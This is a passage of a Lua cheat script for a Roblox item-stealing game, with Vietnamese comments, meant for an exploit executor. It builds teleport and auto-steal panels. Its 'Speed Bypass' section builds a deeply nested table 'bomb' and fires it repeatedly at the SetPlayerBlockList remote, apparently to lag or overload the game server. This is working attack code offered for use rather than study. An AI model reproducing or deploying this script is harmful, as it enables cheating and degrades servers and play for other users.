	LockBtn.TextColor3 = Color3.new(1,1,1)
	LockBtn.Font = Enum.Font.GothamBold
	LockBtn.TextSize = 10
	LockBtn.Visible = false
	Instance.new("UICorner", LockBtn).CornerRadius = UDim.new(0, 6)

	local title = Instance.new("TextLabel", Main)
	title.Size = UDim2.new(1, -62, 0, 30)
	title.Position = UDim2.new(0, 12, 0, y(1))
	title.BackgroundTransparency = 1
	title.Text = "TO BRAINROT"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 16
	title.TextXAlignment = Enum.TextXAlignment.Left

	local CloseBtn = Instance.new("TextButton", Main)
	CloseBtn.Size = UDim2.new(0, 26, 0, 26)
	CloseBtn.Position = UDim2.new(0, 10, 0, y(1))
	CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CloseBtn.Text = "X"
	CloseBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
	CloseBtn.Font = Enum.Font.GothamBold
	CloseBtn.TextSize = 14
	Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)

	local body = Instance.new("Frame", Main)
	body.Name = "Body"
	body.Size = UDim2.new(1, -24, 0, 202)
	body.Position = UDim2.new(0, 12, 0, 44)
	body.BackgroundTransparency = 1
	body.Visible = not MINIMIZE

	local function mkBtn(text, row, col)
 local b = Instance.new("TextButton", body)
 b.Size = UDim2.new(1, 0, 0, ROW)
 b.Position = UDim2.new(0, 0, 0, (row - 1) * (ROW + 4))
 b.BackgroundColor3 = col
 b.Text = text
 b.TextColor3 = Color3.new(1,1,1)
 b.Font = Enum.Font.GothamBold
 b.TextSize = 12
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
 return b
	end
	local function mkLabel(text, row)
 local l = Instance.new("TextLabel", body)
 l.Size = UDim2.new(1, -64, 0, ROW)
 l.Position = UDim2.new(0, 0, 0, (row - 1) * (ROW + 4))
 l.BackgroundTransparency = 1
 l.Text = text
 l.TextColor3 = Color3.fromRGB(180, 180, 200)
 l.Font = Enum.Font.Gotham
 l.TextSize = 11
 l.TextXAlignment = Enum.TextXAlignment.Left
 return l
	end
	local function mkAdj(row, onMinus, onPlus)
 for i, s in ipairs({"-", "+"}) do
 local b = Instance.new("TextButton", body)
 b.Size = UDim2.new(0, 28, 0, 26)
 b.Position = UDim2.new(1, -60 + (i - 1) * 30, 0, (row - 1) * (ROW + 4) + 2)
 b.BackgroundColor3 = Color3.fromRGB(36, 36, 50)
 b.Text = s
 b.TextColor3 = Color3.new(1,1,1)
 b.Font = Enum.Font.GothamBold
 b.TextSize = 14
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 b.MouseButton1Click:Connect(s == "-" and onMinus or onPlus)
 end
	end

	local BtnSaveBase = mkBtn("Luu Base", 1, Color3.fromRGB(110, 70, 190))
	local BtnSavePet = mkBtn("Luu Pet", 2, Color3.fromRGB(210, 110, 40))
	local LblBase = mkLabel("Base: " .. string.format("%.2f", DELAY_BASE) .. "s", 3)
	local LblPet = mkLabel("Pet: " .. string.format("%.2f", DELAY_PET) .. "s", 4)
	mkAdj(3, function()
 DELAY_BASE = math.clamp(DELAY_BASE - 0.01, 0.01, 2)
 St._delayBase = DELAY_BASE
 LblBase.Text = "Base: " .. string.format("%.2f", DELAY_BASE) .. "s"
 saveCfg()
	end, function()
 DELAY_BASE = math.clamp(DELAY_BASE + 0.01, 0.01, 2)
 St._delayBase = DELAY_BASE
 LblBase.Text = "Base: " .. string.format("%.2f", DELAY_BASE) .. "s"
 saveCfg()
	end)
	mkAdj(4, function()
 DELAY_PET = math.clamp(DELAY_PET - 0.01, 0.01, 2)
 St._delayPet = DELAY_PET
 LblPet.Text = "Pet: " .. string.format("%.2f", DELAY_PET) .. "s"
 saveCfg()
	end, function()
 DELAY_PET = math.clamp(DELAY_PET + 0.01, 0.01, 2)
 St._delayPet = DELAY_PET
 LblPet.Text = "Pet: " .. string.format("%.2f", DELAY_PET) .. "s"
 saveCfg()
	end)

	local BtnKey = mkBtn("PHIM: [X]", 5, Color3.fromRGB(45, 45, 60))
	local settingKey = false
	BtnKey.MouseButton1Click:Connect(function()
 settingKey = true
 BtnKey.Text = "Nhan phim..."
	end)

	local BtnTP = Instance.new("TextButton", Main)
	BtnTP.Size = UDim2.new(1, -24, 0, 34)
	BtnTP.Position = UDim2.new(0, 12, 1, -44)
	BtnTP.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	BtnTP.Text = "TP [X]"
	BtnTP.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnTP.BorderSizePixel = 0
	local tpStroke = Instance.new("UIStroke")
	tpStroke.Color = Color3.fromRGB(255, 255, 255)
	tpStroke.Thickness = 1
	tpStroke.Parent = BtnTP
	BtnTP.Font = Enum.Font.GothamBlack
	BtnTP.TextSize = 14
	Instance.new("UICorner", BtnTP).CornerRadius = UDim.new(0, 12)

	if MINIMIZE then
 Main.Size = UDim2.new(0, 230, 0, 82)
 BtnTP.Position = UDim2.new(0, PAD, 0, 38)
 body.Visible = false
	end

	BtnSaveBase.MouseButton1Click:Connect(function()
 local h = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not h then return end
 SAVE_BASE = h.Position
 St._saveBase = {SAVE_BASE.X, SAVE_BASE.Y, SAVE_BASE.Z}
 clearMark(MARK_BASE)
 MARK_BASE = Marker(SAVE_BASE, Color3.fromRGB(255, 105, 180))
 saveCfg()
 BtnSaveBase.Text = "Da luu Base"
 task.delay(0.7, function() BtnSaveBase.Text = "Luu Base" end)
	end)
	BtnSavePet.MouseButton1Click:Connect(function()
 local h = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not h then return end
 SAVE_PET = h.Position
 St._savePet = {SAVE_PET.X, SAVE_PET.Y, SAVE_PET.Z}
 clearMark(MARK_PET)
 MARK_PET = Marker(SAVE_PET, Color3.fromRGB(255, 140, 0))
 saveCfg()
 BtnSavePet.Text = "Da luu Pet"
 task.delay(0.7, function() BtnSavePet.Text = "Luu Pet" end)
	end)

	local function StartTP()
 if IS_TPING or settingKey then return end
 -- re-read from St in case table updated
 SAVE_BASE = toVec(St._saveBase) or SAVE_BASE
 SAVE_PET = toVec(St._savePet) or SAVE_PET
 task.spawn(function()
 local C0 = LP.Character
 local HRP = C0 and C0:FindFirstChild("HumanoidRootPart")
 if not HRP then
 BtnTP.Text = "No character"
 task.wait(0.8)
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 return
 end
 if not SAVE_BASE and not SAVE_PET then
 BtnTP.Text = "Chua luu diem"
 task.wait(0.9)
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 return
 end
 IS_TPING = true
 BtnTP.Text = "Dang TP..."
 local ok, err = pcall(function()
 if (SAVE_BASE and not SAVE_PET) or (SAVE_PET and not SAVE_BASE) then
 ChilliDrop(HRP, SAVE_BASE or SAVE_PET, C0)
 else
 EquipFly(C0)
 SmoothTP(HRP, SAVE_BASE)
 task.wait(tonumber(DELAY_BASE) or 0.15)
 C0 = LP.Character or C0
 HRP = C0 and C0:FindFirstChild("HumanoidRootPart") or HRP
 if HRP and SAVE_PET then SmoothTP(HRP, SAVE_PET) end
 end
 end)
 if not ok then
 warn("[TP] error:", err)
 BtnTP.Text = "Loi TP"
 task.wait(0.8)
 end
 IS_TPING = false
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 end)
	end
	BtnTP.MouseButton1Click:Connect(StartTP)

	LockBtn.MouseButton1Click:Connect(function()
 panelLocked = not panelLocked
 LockBtn.Text = panelLocked and "LOCK" or "UNLOCK"
 LockBtn.BackgroundColor3 = panelLocked and Color3.fromRGB(160, 50, 70) or Color3.fromRGB(32, 32, 44)
 saveCfg()
	end)
	CloseBtn.MouseButton1Click:Connect(function()
 MINIMIZE = not MINIMIZE
 St._tpMinimized = MINIMIZE
 body.Visible = not MINIMIZE
 if MINIMIZE then
 Main.Size = UDim2.new(0, 180, 0, 82)
 BtnTP.Position = UDim2.new(0, PAD, 0, 38)
 CloseBtn.Text = "X"
 else
 Main.Size = UDim2.new(0, 230, 0, 292)
 BtnTP.Position = UDim2.new(0, PAD, 1, -44)
 CloseBtn.Text = "−"
 end
 saveCfg()
	end)

	do
 local dragging, dragStart, startPos
 Main.InputBegan:Connect(function(input)
 if panelLocked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = Main.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 St._tpMainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 saveCfg()
 end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if not dragging or panelLocked then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
	end

	UIS.InputBegan:Connect(function(input, gp)
 if gp then return end
 if settingKey and input.UserInputType == Enum.UserInputType.Keyboard then
 KEYBIND_TP = input.KeyCode
 St._keyTP = KEYBIND_TP.Name
 settingKey = false
 BtnKey.Text = "PHIM: [" .. KEYBIND_TP.Name .. "]"
 BtnTP.Text = "TP [" .. KEYBIND_TP.Name .. "]"
 saveCfg()
 return
 end
 if input.KeyCode == KEYBIND_TP then StartTP() end
	end)

	print("[ILUSIÓN] Compact TP panel ready | rainbow | markers | key X")
end)




-- ============================================================
-- STEAL BAR only (ILUSIÓN style) — NO external Auto Steal GUI
-- Hiện khi Auto Steal ON | kéo được | chỉnh size
-- ============================================================
task.spawn(function()
	-- kill external auto-steal panels from embedded script
	-- Chỉ xoá panel auto-steal CỦA VIS (trùng), KHÔNG huỷ steal bar script khác (lkz…)
	local function killStealGuis()
 pcall(function()
 local parents = {PlayerGui}
 pcall(function() table.insert(parents, game:GetService("CoreGui")) end)
 pcall(function() if gethui then table.insert(parents, gethui()) end end)
 local own = {
 visautostealgui = true,
 visautosteal = true,
 aceautosteal = true,
 vis_auto_steal = true,
 }
 for _, parent in ipairs(parents) do
 for _, g in ipairs(parent:GetChildren()) do
 local n = (g.Name or ""):lower():gsub("%s+", "")
 -- giữ IlusionStealBarOnly + bar script khác
 if n == "visstealbaronly" then
 -- keep
 elseif own[n] or n:find("visautosteal", 1, true) then
 pcall(function() g:Destroy() end)
 end
 end
 end
 end)
	end
	killStealGuis()
	-- không loop destroy 0.5s (tránh đụng bar lkz) — chỉ clean 1 lần lúc load


	pcall(function()
 local o = PlayerGui:FindFirstChild("IlusionStealBarOnly")
 if o then o:Destroy() end
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "IlusionStealBarOnly"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 200000 -- đè lên bar script khác, không xoá chúng
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = PlayerGui

	local scale = tonumber(St.stealBarScale) or 1
	local barW, barH = math.floor(280 * scale), math.floor(36 * scale)

	local frame = Instance.new("Frame")
	frame.Name = "StealBar"
	frame.Size = UDim2.new(0, barW, 0, barH)
	if type(St._stealBarPos) == "table" then
 frame.Position = UDim2.new(St._stealBarPos[1], St._stealBarPos[2], St._stealBarPos[3], St._stealBarPos[4])
	else
 frame.Position = UDim2.new(0.5, -barW/2, 0.12, 0)
	end
	frame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
	frame.BackgroundTransparency = 0.15
	frame.BorderSizePixel = 0
	frame.Visible = true
	frame.Active = true
	frame.Parent = gui
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
	local stroke = Instance.new("UIStroke", frame)
	stroke.Color = Color3.fromRGB(70, 90, 140)
	stroke.Thickness = 1.2

	local title = Instance.new("TextLabel", frame)
	title.Name = "Title"
	title.Size = UDim2.new(0.42, 0, 1, 0)
	title.Position = UDim2.new(0, 10, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "STEALING..."
	title.TextColor3 = Color3.fromRGB(200, 220, 255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 11
	title.TextXAlignment = Enum.TextXAlignment.Left

	local track = Instance.new("Frame", frame)
	track.Name = "Track"
	track.Size = UDim2.new(0.38, 0, 0, 8)
	track.Position = UDim2.new(0.40, 0, 0.5, -4)
	track.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
	track.BorderSizePixel = 0
	Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

	local fill = Instance.new("Frame", track)
	fill.Name = "Fill"
	fill.Size = UDim2.new(0, 0, 1, 0)
	fill.BackgroundColor3 = Color3.fromRGB(100, 255, 160)
	fill.BorderSizePixel = 0
	Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
	local grad = Instance.new("UIGradient", fill)
	grad.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 210)),
	})

	local pctLbl = Instance.new("TextLabel", frame)
	pctLbl.Name = "Pct"
	pctLbl.Size = UDim2.new(0.18, -8, 1, 0)
	pctLbl.Position = UDim2.new(0.80, 0, 0, 0)
	pctLbl.BackgroundTransparency = 1
	pctLbl.Text = "0%"
	pctLbl.TextColor3 = Color3.fromRGB(180, 200, 230)
	pctLbl.Font = Enum.Font.GothamBold
	pctLbl.TextSize = 11
	pctLbl.TextXAlignment = Enum.TextXAlignment.Right

	-- FPS + Ping (Empire style)
	local metaLbl = Instance.new("TextLabel", frame)
	metaLbl.Name = "MetaFpsPing"
	metaLbl.Size = UDim2.new(0.55, 0, 0, 14)
	metaLbl.Position = UDim2.new(0, 10, 1, -16)
	metaLbl.BackgroundTransparency = 1
	metaLbl.Text = "FPS // -- PING // -- ms"
	metaLbl.TextColor3 = Color3.fromRGB(140, 145, 165)
	metaLbl.Font = Enum.Font.GothamBold
	metaLbl.TextSize = 10
	metaLbl.TextXAlignment = Enum.TextXAlignment.Left
	metaLbl.ZIndex = 5
	-- enlarge bar a bit for meta
	frame.Size = UDim2.new(0, barW, 0, math.max(barH, 48))
	task.spawn(function()
 local fps, frames, t0 = 60, 0, tick()
 local pingMs = "--"
 while gui and gui.Parent do
 frames = frames + 1
 if tick() - t0 >= 0.5 then
 fps = math.floor(frames / (tick() - t0) + 0.5)
 frames = 0
 t0 = tick()
 pcall(function()
 local p = LP:GetNetworkPing()
 if typeof(p) == "number" then
 pingMs = tostring(math.floor(p * 1000 + 0.5))
 end
 end)
 metaLbl.Text = string.format("FPS // %s PING // %s ms", tostring(fps), tostring(pingMs))
 end
 task.wait()
 end
	end)

	-- size +/- corner
	local szMinus = Instance.new("TextButton", frame)
	szMinus.Size = UDim2.new(0, 16, 0, 16)
	szMinus.Position = UDim2.new(1, -34, 0, 2)
	szMinus.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
	szMinus.Text = "−"
	szMinus.TextColor3 = Color3.new(1,1,1)
	szMinus.TextSize = 12
	szMinus.Font = Enum.Font.GothamBold
	szMinus.ZIndex = 3
	Instance.new("UICorner", szMinus).CornerRadius = UDim.new(1, 0)
	local szPlus = Instance.new("TextButton", frame)
	szPlus.Size = UDim2.new(0, 16, 0, 16)
	szPlus.Position = UDim2.new(1, -16, 0, 2)
	szPlus.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
	szPlus.Text = "+"
	szPlus.TextColor3 = Color3.new(1,1,1)
	szPlus.TextSize = 12
	szPlus.Font = Enum.Font.GothamBold
	szPlus.ZIndex = 3
	Instance.new("UICorner", szPlus).CornerRadius = UDim.new(1, 0)

	local function applyScale()
 scale = math.clamp(tonumber(St.stealBarScale) or 1, 0.5, 2.5)
 St.stealBarScale = scale
 barW = math.floor(280 * scale)
 barH = math.max(28, math.floor(42 * scale)) -- cao hơn một chút cho FPS line
 frame.Size = UDim2.new(0, barW, 0, barH)
 if title then title.TextSize = math.max(9, math.floor(11 * scale)) end
 if pctLbl then pctLbl.TextSize = math.max(9, math.floor(11 * scale)) end
 local meta = frame:FindFirstChild("MetaFpsPing")
 if meta then
 meta.TextSize = math.max(8, math.floor(10 * scale))
 meta.Size = UDim2.new(0.55, 0, 0, math.max(12, math.floor(14 * scale)))
 meta.Position = UDim2.new(0, 10, 1, -math.max(14, math.floor(16 * scale)))
 end
 local fill = frame:FindFirstChild("Fill") or frame:FindFirstChild("BarFill")
 -- progress row height scale if exists
 for _, ch in ipairs(frame:GetChildren()) do
 if ch:IsA("Frame") and (ch.Name == "BarBg" or ch.Name == "Progress" or ch.Name == "FillBg") then
 pcall(function()
 ch.Size = UDim2.new(ch.Size.X.Scale, ch.Size.X.Offset, 0, math.max(6, math.floor(10 * scale)))
 end)
 end
 end
 pcall(saveCfg)
	end
	szMinus.Active = true
	szPlus.Active = true
	szMinus.ZIndex = 20
	szPlus.ZIndex = 20
	local function onMinus()
 St.stealBarScale = math.clamp((tonumber(St.stealBarScale) or 1) - 0.1, 0.5, 2.5)
 applyScale()
	end
	local function onPlus()
 St.stealBarScale = math.clamp((tonumber(St.stealBarScale) or 1) + 0.1, 0.5, 2.5)
 applyScale()
	end
	szMinus.MouseButton1Click:Connect(onMinus)
	szMinus.MouseButton1Down:Connect(onMinus)
	szMinus.Activated:Connect(onMinus)
	szPlus.MouseButton1Click:Connect(onPlus)
	szPlus.MouseButton1Down:Connect(onPlus)
	szPlus.Activated:Connect(onPlus)
	-- apply saved scale on build
	pcall(applyScale)

	-- drag
	do
 local dragging, dragStart, startPos
 frame.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = frame.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 St._stealBarPos = {frame.Position.X.Scale, frame.Position.X.Offset, frame.Position.Y.Scale, frame.Position.Y.Offset}
 saveCfg()
 end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if not dragging or St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
	end

	-- progress loop — TẮT auto steal: giữ bar, chỉ về 0% (không ẩn bar)
	frame.Visible = true
	RS.RenderStepped:Connect(function()
 local on = St.autoSteal == true
 -- luôn hiện bar; OFF chỉ dừng logic + 0%
 frame.Visible = true
 local p = 0
 if on then
 p = math.clamp(tonumber(_G.AceStealBarProgress) or 0, 0, 1)
 else
 -- OFF: force 0
 _G.AceStealBarProgress = 0
 p = 0
 end
 fill.Size = UDim2.new(p, 0, 1, 0)
 local pct = math.floor(p * 100 + 0.5)
 pctLbl.Text = tostring(pct) .. "%"
 if not on then
 title.Text = "OFF"
 title.TextColor3 = Color3.fromRGB(160, 160, 170)
 pctLbl.TextColor3 = Color3.fromRGB(150, 150, 160)
 elseif p > 0.01 then
 title.Text = "STEALING..."
 title.TextColor3 = Color3.fromRGB(180, 220, 255)
 if pct >= 100 then
 pctLbl.TextColor3 = Color3.fromRGB(120, 255, 160)
 elseif pct >= 75 then
 pctLbl.TextColor3 = Color3.fromRGB(255, 230, 100)
 else
 pctLbl.TextColor3 = Color3.fromRGB(200, 210, 230)
 end
 else
 title.Text = "READY"
 title.TextColor3 = Color3.fromRGB(140, 255, 180)
 pctLbl.Text = "0%"
 pctLbl.TextColor3 = Color3.fromRGB(180, 200, 230)
 end
	end)

	-- override StealBar API to drive this bar
	_G.StealBar = {
 SetProgress = function(p)
 _G.AceStealBarProgress = math.clamp(tonumber(p) or 0, 0, 1)
 end,
 Reset = function()
 _G.AceStealBarProgress = 0
 end,
 SetState = function(state)
 if tostring(state) == "SUCCESS" then
 _G.AceStealBarProgress = 1
 end
 end,
	}

	
----------------------------------------------------------------
-- 
----------------------------------------------------------------
-- ACE SPEED BYPASS (full) — mini = ON/OFF EN + Lock | scale panels
----------------------------------------------------------------
-- ===== ILUSIÓN FULL: Speed Bypass + Lagger V2 (replace All Gear old panels) =====
-- IlusionBypass — Speed Bypass (Noxa-style UI + keybind PC + minimize + bg)
-- ============================================================
task.spawn(function()
	local Players = game:GetService("Players")
	local LP = Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")
	local UIS = UserInputService
	local DEPTH = 296
	local SPAM_DELAY = 0.12
	local running = false
	local bomb = nil
	local spamThread = nil
	local ConfigFile = "IlusionBypass.json"
	-- Dùng full list BackgroundIDs của (1–50+)
	local BG_IDS = (BackgroundIDs and #BackgroundIDs > 0) and BackgroundIDs or {
 "89504528485163", "108697485255882", "71211662493854", "118953269416540", "106345334781345",
	}

	local function buildBomb(power)
 local maintable = {}
 local spammedtable = {{}}
 local z = spammedtable[1]
 for i = 1, DEPTH do
 local tableins = {}
 table.insert(z, tableins)
 z = tableins
 end
 local maxRep = math.floor((tonumber(power) or 97000) / (DEPTH + 2))
 maxRep = math.clamp(maxRep, 1, 50000)
 for i = 1, maxRep do
 table.insert(maintable, spammedtable)
 end
 return maintable
	end

	local function stopBypass()
 running = false
 if spamThread then pcall(function() task.cancel(spamThread) end) end
 bomb = nil
 spamThread = nil
	end

	local function startBypass(power)
 stopBypass()
 running = true
 bomb = buildBomb(power)
 spamThread = task.spawn(function()
 while running do
 if bomb then
 pcall(function()
 game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(bomb)
 end)
 end
 task.wait(SPAM_DELAY)
 end
 end)
	end

	_G.AceSetVisBypassEnabled = function(on, power)
 if on then startBypass(power or 97000) else stopBypass() end
	end
	_G.AceToggleVisBypass = function(power)
 if running then stopBypass() else startBypass(power or 97000) end
 return running
	end
	_G.AceVisBypassActive = function() return running end

	local savedPos = nil
	local savedBgIndex = 1
	local boundKey = Enum.KeyCode.V
	local waitingForKey = false
	local savedPanelOpen = false
	local savedMinimized = false
	local savedWantedActive = false
	pcall(function()
 if isfile and isfile(ConfigFile) then
 local data = game:GetService("HttpService"):JSONDecode(readfile(ConfigFile))
 if type(data.Pos) == "table" then savedPos = data.Pos end
 if data.Power then _G.AceVisBypassPower = tonumber(data.Power) or 97000 end
 if data.BgIndex then savedBgIndex = math.clamp(tonumber(data.BgIndex) or 1, 1, #BG_IDS) end
 if type(data.Keybind) == "string" and Enum.KeyCode[data.Keybind] then
 boundKey = Enum.KeyCode[data.Keybind]
 end
 -- Nhớ panel mở / minimize / bypass đang ON trước khi out
 savedPanelOpen = data.PanelOpen == true
 savedMinimized = data.Minimized == true
 savedWantedActive = data.WantedActive == true
 _G.AceVisBypassPanelOpen = savedPanelOpen
 end
	end)

	-- State snapshot (khai báo sớm để saveCfg luôn đọc được)
	local uiMinimized = false
	local uiWantedActive = false
	local uiActive = false

	local function saveCfg(mainFrame, power, extra)
 local panelIsOpen = (_G.AceVisBypassPanelOpen == true)
 pcall(function()
 if main and main.Visible then panelIsOpen = true end
 if mini and mini.Visible then panelIsOpen = true end
 end)
 local data = {
 Power = tonumber(power) or 97000,
 BgIndex = savedBgIndex,
 Keybind = boundKey and boundKey.Name or "V",
 PanelOpen = panelIsOpen,
 Minimized = uiMinimized == true,
 WantedActive = uiWantedActive == true or uiActive == true,
 }
 if type(extra) == "table" then
 for k, v in pairs(extra) do data[k] = v end
 end
 if mainFrame and mainFrame.Parent then
 local p = mainFrame.Position
 data.Pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 savedPos = data.Pos
 _G.AceVisBypassPanelPosition = data.Pos
 elseif type(_G.AceVisBypassPanelPosition) == "table" then
 data.Pos = _G.AceVisBypassPanelPosition
 elseif type(savedPos) == "table" then
 data.Pos = savedPos
 end
 savedPanelOpen = data.PanelOpen == true
 savedMinimized = data.Minimized == true
 savedWantedActive = data.WantedActive == true
 _G.AceVisBypassPanelOpen = savedPanelOpen
 _G.AceVisBypassMinimized = savedMinimized
 _G.AceVisBypassWantedActive = savedWantedActive
 _G.AceVisBypassPower = data.Power
 _G.AceSBPEnabled = savedWantedActive
 pcall(function()
 writefile(ConfigFile, game:GetService("HttpService"):JSONEncode(data))
 end)
 pcall(function() if saveAceConfig then saveAceConfig() end end)
	end

	local parent = (gethui and gethui()) or game:GetService("CoreGui")
	pcall(function()
 local old = parent:FindFirstChild("IlusionBypassGui")
 if old then old:Destroy() end
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "IlusionBypassGui"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Enabled = true
	gui.DisplayOrder = 250
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	pcall(function() gui.Parent = parent end)
	if not gui.Parent then
 local pg = (Players.LocalPlayer or game:GetService("Players").LocalPlayer):WaitForChild("PlayerGui")
 gui.Parent = pg
	end

	local function corner(obj, r)
 local c = Instance.new("UICorner")
 c.CornerRadius = UDim.new(0, r or 8)
 c.Parent = obj
 return c
	end
	local function stroke(obj, col, th, tr)
 local s = Instance.new("UIStroke")
 s.Color = col or Color3.fromRGB(41, 128, 255)
 s.Thickness = th or 1
 s.Transparency = tr or 0.3
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = obj
 return s
	end

	-- ===== FULL PANEL =====
	local W, H = 230, 320
	local main = Instance.new("Frame")
	main.Name = "MainFrame"
	main.Size = UDim2.fromOffset(W, H)
	if type(savedPos) == "table" then
 main.Position = UDim2.new(tonumber(savedPos.xs) or 0.5, tonumber(savedPos.xo) or -115, tonumber(savedPos.ys) or 0.35, tonumber(savedPos.yo) or 0)
	else
 main.Position = UDim2.new(0.5, -115, 0.35, 0)
	end
	main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	main.BorderSizePixel = 0
	main.Active = true
	main.Visible = false
	main.ClipsDescendants = true
	main.Parent = gui
	corner(main, 13)
	stroke(main, Color3.fromRGB(39, 39, 39), 1.3)

	-- Background image (Noxa-style)
	local bgImg = Instance.new("ImageLabel", main)
	bgImg.Name = "BgImage"
	bgImg.Size = UDim2.new(1, 0, 1, 0)
	bgImg.BackgroundTransparency = 1
	bgImg.Image = "rbxassetid://" .. (BG_IDS[savedBgIndex] or BG_IDS[1])
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.ImageTransparency = 0.35
	bgImg.ZIndex = 0
	corner(bgImg, 13)

	local header = Instance.new("Frame", main)
	header.Size = UDim2.new(1, -6, 0, 31)
	header.Position = UDim2.fromOffset(3, 3)
	header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	header.BackgroundTransparency = 0.15
	header.BorderSizePixel = 0
	header.ZIndex = 4
	corner(header, 10)

	local titleNoxa = Instance.new("TextLabel", header)
	titleNoxa.Size = UDim2.fromOffset(36, 31)
	titleNoxa.Position = UDim2.fromOffset(12, 0)
	titleNoxa.BackgroundTransparency = 1
	titleNoxa.Text = "VIS"
	titleNoxa.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleNoxa.Font = Enum.Font.GothamBold
	titleNoxa.TextSize = 12
	titleNoxa.TextXAlignment = Enum.TextXAlignment.Left
	titleNoxa.ZIndex = 6

	local titleBypass = Instance.new("TextLabel", header)
	titleBypass.Size = UDim2.fromOffset(70, 31)
	titleBypass.Position = UDim2.fromOffset(44, 0)
	titleBypass.BackgroundTransparency = 1
	titleBypass.Text = "BYPASS"
	titleBypass.TextColor3 = Color3.fromRGB(41, 128, 255)
	titleBypass.Font = Enum.Font.GothamBold
	titleBypass.TextSize = 12
	titleBypass.TextXAlignment = Enum.TextXAlignment.Left
	titleBypass.ZIndex = 6

	-- LOCK ngay cạnh nút - (giống Ping Lagger: LOCK cạnh ⚙)
	local lockBtn = Instance.new("TextButton", header)
	lockBtn.Size = UDim2.fromOffset(48, 22)
	lockBtn.Position = UDim2.new(1, -88, 0.5, -11)
	lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
	lockBtn.BorderSizePixel = 0
	lockBtn.Text = "LOCK"
	lockBtn.TextColor3 = Color3.fromRGB(180, 180, 190)
	lockBtn.Font = Enum.Font.GothamBold
	lockBtn.TextSize = 9
	lockBtn.ZIndex = 8
	lockBtn.AutoButtonColor = false
	corner(lockBtn, 6)
	stroke(lockBtn, Color3.fromRGB(48, 48, 48), 1)

	local hideBtn = Instance.new("TextButton", header)
	hideBtn.Size = UDim2.fromOffset(30, 22)
	hideBtn.Position = UDim2.new(1, -36, 0.5, -11)
	hideBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	hideBtn.BorderSizePixel = 0
	hideBtn.Text = "-"
	hideBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	hideBtn.Font = Enum.Font.GothamBold
	hideBtn.TextSize = 16
	hideBtn.ZIndex = 7
	hideBtn.AutoButtonColor = false
	corner(hideBtn, 7)
	stroke(hideBtn, Color3.fromRGB(48, 48, 48), 1)

	-- Keybind row
	local keyRow = Instance.new("Frame", main)
	keyRow.Size = UDim2.new(1, -18, 0, 28)
	keyRow.Position = UDim2.fromOffset(9, 42)
	keyRow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	keyRow.BackgroundTransparency = 0.2
	keyRow.BorderSizePixel = 0
	keyRow.ZIndex = 4
	corner(keyRow, 7)
	stroke(keyRow, Color3.fromRGB(44, 44, 44), 1)

	local kbLbl = Instance.new("TextLabel", keyRow)
	kbLbl.Size = UDim2.fromOffset(28, 28)
